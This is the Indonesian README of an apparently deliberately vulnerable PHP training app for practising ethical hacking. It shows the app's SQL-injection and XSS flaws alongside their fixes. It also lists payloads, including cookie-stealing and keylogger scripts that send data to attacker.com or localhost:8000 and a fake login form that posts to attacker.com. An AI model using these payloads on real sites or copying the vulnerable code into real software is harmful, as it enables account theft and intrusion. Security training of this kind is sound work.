# IVWA - Intentional Vulnerable Web Application

## Dokumentasi Lengkap

Selamat datang di IVWA! Aplikasi ini adalah platform pembelajaran cybersecurity yang **sengaja dibuat dengan vulnerability** untuk tujuan edukasi dan pelatihan ethical hacking.

---

## 📋 Daftar Isi

1. [Instalasi & Setup](#instalasi--setup)
2. [Struktur Project](#struktur-project)
3. [Vulnerability yang Dipelajari](#vulnerability-yang-dipelajari)
4. [Demo Credentials](#demo-credentials)
5. [Contoh Payload](#contoh-payload)
6. [Secure Fixes](#secure-fixes)
7. [Tools untuk Testing](#tools-untuk-testing)
8. [FAQ](#faq)

---

## 🚀 Instalasi & Setup

### Prasyarat
- Apache/Nginx web server
- PHP 7.0+
- MySQL/MariaDB 5.5+
- Akses ke terminal/command line

### Langkah Instalasi

#### 1. Copy files ke web root
```bash
# Jika menggunakan XAMPP/LAMPP
cp -r myOwn-ivwa /opt/lampp/htdocs/

# Atau di direktori lain sesuai konfigurasi
```

#### 2. Setup Database

**Opsi A: Menggunakan MySQL Client**
```bash
mysql -u root -p < database/init.sql
```

**Opsi B: Menggunakan phpMyAdmin**
1. Buka `http://localhost/phpmyadmin`
2. Login dengan credential MySQL Anda
3. Klik tab "Import"
4. Pilih file `database/init.sql`
5. Klik "Go"

**Opsi C: Manual di Database Client**
```sql
-- Buat database
CREATE DATABASE ivwa;
USE ivwa;

-- Buat table users
CREATE TABLE users (
  id INT AUTO_INCREMENT PRIMARY KEY,
  username VARCHAR(50) NOT NULL UNIQUE,
  password VARCHAR(255) NOT NULL,
  email VARCHAR(100),
  full_name VARCHAR(100),
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Buat table comments
CREATE TABLE comments (
  id INT AUTO_INCREMENT PRIMARY KEY,
  user_id INT NOT NULL,
  username VARCHAR(50) NOT NULL,
  comment_text LONGTEXT NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);

-- Insert dummy data
INSERT INTO users (username, password, email, full_name) VALUES
('admin', 'password123', 'admin@ivwa.local', 'Administrator'),
('user1', 'password123', 'user1@ivwa.local', 'User One'),
('user2', 'password123', 'user2@ivwa.local', 'User Two'),
('hacker', 'password123', 'hacker@ivwa.local', 'Hacker');

INSERT INTO comments (user_id, username, comment_text) VALUES
(1, 'admin', 'Welcome to IVWA!'),
(2, 'user1', 'Sample comment for testing'),
(3, 'user2', 'Please be careful with XSS payload');
```

#### 3. Edit Konfigurasi Database

Edit file `config/db.php`:
```php
define('DB_HOST', 'localhost');
define('DB_USER', 'root');        // Sesuaikan dengan username MySQL Anda
define('DB_PASS', '');            // Sesuaikan dengan password MySQL Anda
define('DB_NAME', 'ivwa');
```

#### 4. Jalankan Aplikasi

```bash
# Start Apache dan MySQL (jika XAMPP/LAMPP)
sudo /opt/lampp/lampp start

# Atau jika menggunakan Apache langsung
sudo systemctl start apache2
sudo systemctl start mysql

# Buka browser ke http://localhost/myOwn-ivwa
```

---

## 📁 Struktur Project

```
myOwn-ivwa/
├── index.php                      # Halaman utama/welcome page
├── login.php                      # Halaman login (SQL Injection vulnerability)
├── dashboard.php                  # Dashboard user (Stored XSS vulnerability)
├── search.php                     # Halaman search (Reflected XSS vulnerability)
├── logout.php                     # Logout script
│
├── config/
│   └── db.php                     # Database configuration
│
├── database/
│   └── init.sql                   # Database schema & dummy data
│
├── assets/
│   ├── style.css                  # CSS styling
│   └── secure-examples.php        # Contoh secure implementation
│
├── modules/
│   ├── csrf/                      # CSRF examples (untuk ekspansi)
│   ├── idor/                      # IDOR examples (untuk ekspansi)
│   ├── sqli/                      # SQL Injection examples (untuk ekspansi)
│   ├── upload/                    # File upload examples (untuk ekspansi)
│   └── xss/                       # XSS examples (untuk ekspansi)
│
└── README.md                      # Dokumentasi ini
```

---

## 🔓 Vulnerability yang Dipelajari

### 1. SQL Injection (SQLi)

**Lokasi:** `login.php`

**Penjelasan:**
- Query login menggunakan raw SQL concatenation tanpa prepared statement
- User input tidak di-sanitasi sebelum digunakan dalam query
- Attacker bisa bypass authentication atau mengakses data unauthorized

**Vulnerable Code:**
```php
// Di login.php
$username = $_POST['username'];
$password = $_POST['password'];

// VULNERABLE: Direct string concatenation
$query = "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'";
$result = $conn->query($query);
```

**Contoh Attack:**
```
Username: admin' OR '1'='1
Password: anything
Query yang dijalankan: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```

Karena `'1'='1'` selalu TRUE, query akan mengembalikan user pertama (biasanya admin).

**Secure Fix:**
```php
// Gunakan prepared statement
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

---

### 2. Stored XSS (Persistent XSS)

**Lokasi:** `dashboard.php` - Comment form

**Penjelasan:**
- Komentar disimpan langsung ke database tanpa sanitasi
- Saat ditampilkan, HTML/JavaScript tidak di-escape
- Attacker bisa inject JavaScript yang dijalankan untuk semua user

**Vulnerable Code:**
```php
// Di dashboard.php - Display comments
while ($comment = $comments_result->fetch_assoc()): 
    <div class="comment-text">
        <?php echo $comment['comment_text']; ?>  <!-- VULNERABLE! -->
    </div>
endwhile;
```

**Contoh Attack:**
```html
<!-- Payload di comment form: -->
<img src=x onerror="alert('XSS Vulnerability!')">

<!-- Atau lebih berbahaya: -->
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Atau inject form login palsu: -->
<div style="border:1px solid red; padding:10px;">
  <h3>Session Expired. Please Login Again:</h3>
  <form action="http://attacker.com/capture" method="POST">
    <input type="text" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <button type="submit">Login</button>
  </form>
</div>
```

**Secure Fix:**
```php
// Gunakan htmlspecialchars() saat output
<?php echo htmlspecialchars($comment['comment_text'], ENT_QUOTES, 'UTF-8'); ?>

// Atau lebih ketat, validate di input
$comment_text = strip_tags($_POST['comment_text']); // Remove semua HTML tags
```

---

### 3. Reflected XSS

**Lokasi:** `search.php` - Search parameter

**Penjelasan:**
- Query parameter ditampilkan langsung ke halaman tanpa escaping
- Tidak disimpan ke database (reflected)
- Attacker bisa share URL dengan payload XSS

**Vulnerable Code:**
```php
// Di search.php
if ($_GET['q']) {
    $search_query = $_GET['q'];
    
    // VULNERABLE: Ditampilkan langsung tanpa escaping
    <h2>Search results for: <?php echo $search_query; ?></h2>
}
```

**Contoh Attack:**
```
URL: http://localhost/myOwn-ivwa/search.php?q=<img src=x onerror="alert('Reflected XSS')">

Atau lebih praktis untuk share:
http://localhost/myOwn-ivwa/search.php?q=%3Cimg%20src=x%20onerror=%22alert('XSS')%22%3E

Atau payload untuk steal cookies:
?q=<svg onload="new Image().src='http://attacker.com/log.php?c='+document.cookie">
```

**Secure Fix:**
```php
// Gunakan htmlspecialchars() saat menampilkan user input
<h2>Search results for: <?php echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8'); ?></h2>

// Atau gunakan strip_tags jika ingin lebih strict
<h2>Search results for: <?php echo strip_tags($_GET['q']); ?></h2>
```

---

## 👤 Demo Credentials

Gunakan salah satu credential berikut untuk login:

| Username | Password    | Email              | Full Name      |
|----------|-------------|-------------------|----------------|
| admin    | password123 | admin@ivwa.local  | Administrator  |
| user1    | password123 | user1@ivwa.local  | User One       |
| user2    | password123 | user2@ivwa.local  | User Two       |
| hacker   | password123 | hacker@ivwa.local | Hacker         |

---

## 💉 Contoh Payload

### SQL Injection Payloads

#### Bypass Login (Admin)
```
Username: admin' --
Password: anything
(-- adalah comment di SQL, jadi password check di-skip)

Atau:
Username: admin' OR '1'='1
Password: anything
```

#### Extract Data
```
Username: ' UNION SELECT 1,username,password,email,full_name FROM users --
Password: anything
(Ini akan menampilkan hasil UNION - perlu tamper output)
```

#### Extract Users
```
Username: admin' OR 1=1 --
Password: anything
```

### Stored XSS Payloads

#### Simple Alert
```html
<img src=x onerror="alert('XSS')">
```

#### Cookie Stealer (untuk learning saja!)
```html
<img src=x onerror="fetch('http://localhost:8000/log?c='+document.cookie)">
```

#### Defacement
```html
<script>
document.body.innerHTML = '<h1>HACKED by XSS!</h1>';
</script>
```

#### Redirect
```html
<img src=x onerror="window.location.href='http://attacker.com'">
```

#### Keylogger (Educational)
```html
<script>
document.onkeypress = function(e) {
  fetch('http://localhost:8000/log?key='+String.fromCharCode(e.which));
}
</script>
```

### Reflected XSS Payloads

#### Simple Pop-up
```
?q=<img src=x onerror="alert('Reflected XSS')">
```

#### URL Encoded (lebih aman untuk share)
```
?q=%3Cimg%20src=x%20onerror=%22alert('XSS')%22%3E
```

#### Break out dari attribute
```
?q=" onerror="alert('XSS')" x="
```

#### SVG Vector
```
?q=<svg onload="alert('XSS')">
```

#### Event Handler
```
?q=<body onload="alert('XSS')">
```

---

## 🔐 Secure Fixes

Lihat file `assets/secure-examples.php` untuk contoh implementasi yang secure untuk setiap vulnerability.

### SQL Injection - Secure Fix
```php
// Gunakan Prepared Statements
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();

// Atau gunakan parameterized query
$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $_POST['username'], $_POST['password']);
$stmt->execute();
```

### Stored XSS - Secure Fix
```php
// Output: Escape HTML entities
echo htmlspecialchars($comment['comment_text'], ENT_QUOTES, 'UTF-8');

// Input: Strict validation
$comment_text = strip_tags($_POST['comment_text']); // Remove all HTML
$comment_text = filter_var($comment_text, FILTER_SANITIZE_STRING);
```

### Reflected XSS - Secure Fix
```php
// Escape saat output
echo htmlspecialchars($_GET['q'], ENT_QUOTES, 'UTF-8');

// Atau use strip_tags
echo strip_tags($_GET['q']);

// Atau use htmlentities
echo htmlentities($_GET['q']);
```

---

## 🛠️ Tools untuk Testing

### Browser Tools
- **Developer Tools (F12)** - Lihat HTML, Console, Network
- **Burp Suite Community** - Untuk intercepting requests
- **OWASP ZAP** - Web security scanner

### Command Line Tools
```bash
# Test SQL Injection
sqlmap -u "http://localhost/myOwn-ivwa/login.php" --forms

# Test XSS
python3 xss-scanner.py http://localhost/myOwn-ivwa/search.php

# Network sniffing
tcpdump -i any -A

# Curl untuk manual testing
curl 'http://localhost/myOwn-ivwa/search.php?q=%3Cimg%20src=x%20onerror=%22alert(1)%22%3E'
```

### Python Script untuk Testing
```python
import requests

# Test Reflected XSS
payload = '<img src=x onerror="alert(1)">'
url = f'http://localhost/myOwn-ivwa/search.php?q={payload}'
r = requests.get(url)
if payload in r.text:
    print("XSS Vulnerability Found!")

# Test SQL Injection
payload = "admin' OR '1'='1"
data = {'username': payload, 'password': 'test'}
r = requests.post('http://localhost/myOwn-ivwa/login.php', data=data)
if 'dashboard' in r.url:  # Jika redirect ke dashboard
    print("SQL Injection Successful!")
```

---

## ❓ FAQ

### Q: Bagaimana jika password saya berbeda?
**A:** Edit file `config/db.php` dan sesuaikan `DB_PASS` dengan password MySQL Anda.

### Q: Error "Connection failed"?
**A:** 
1. Pastikan MySQL/MariaDB sudah running
2. Cek username dan password di `config/db.php`
3. Cek nama database sudah dibuat (default: `ivwa`)

### Q: Bagaimana cara menambah user baru?
**A:** Insert ke tabel users:
```sql
INSERT INTO users (username, password, email, full_name) VALUES 
('newuser', 'password123', 'newuser@ivwa.local', 'New User');
```

### Q: Bisakah saya menggunakan password yang lebih aman?
**A:** Ya, tapi ingat tujuannya adalah pembelajaran. Untuk production:
- Hash password dengan `password_hash()`
- Gunakan SSL/TLS
- Implement rate limiting
- Add CSRF tokens
- Use prepared statements

### Q: Aplikasi ini cocok untuk production?
**A:** **TIDAK!** Aplikasi ini HANYA untuk pembelajaran lokal. Jangan pernah deploy ke production.

### Q: Bagaimana jika saya lupa password admin?
**A:** Ganti langsung di database:
```sql
UPDATE users SET password='newpassword123' WHERE username='admin';
```

### Q: Bisakah saya share aplikasi ini dengan orang lain?
**A:** Ya, untuk tujuan pembelajaran. Pastikan mereka memahami bahwa ini hanya untuk environment lokal yang aman.

---

## 📚 Referensi Pembelajaran

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

---

## ⚠️ DISCLAIMER

```
IVWA adalah aplikasi yang SENGAJA dibuat vulnerable untuk tujuan pembelajaran.
Aplikasi ini HANYA boleh dijalankan di:
- Localhost
- Environment offline/sandbox
- Lab pribadi Anda
- Sistem yang Anda miliki atau sudah mendapat izin

Jangan pernah:
- Deploy ke production server
- Gunakan di internet-facing environment
- Test di sistem yang bukan milik Anda tanpa permission
- Gunakan untuk tujuan illegal atau tidak etis
- Share credentials dengan orang yang tidak terpercaya

Pengguna bertanggung jawab penuh atas penggunaan aplikasi ini.
Developer tidak bertanggung jawab atas segala kerusakan atau kerugian.
```

---

## 📝 Versi & Changelog

### v1.0 (2024)
- ✅ SQL Injection vulnerability di login page
- ✅ Stored XSS vulnerability di comment form
- ✅ Reflected XSS vulnerability di search page
- ✅ Basic user authentication
- ✅ Database schema dengan dummy data
- ✅ Documentation lengkap

### v1.1 (Future)
- [ ] CSRF vulnerability examples
- [ ] IDOR vulnerability examples
- [ ] File upload vulnerability
- [ ] Authentication bypass techniques
- [ ] API security examples

---

Created for educational purposes only. Use responsibly!
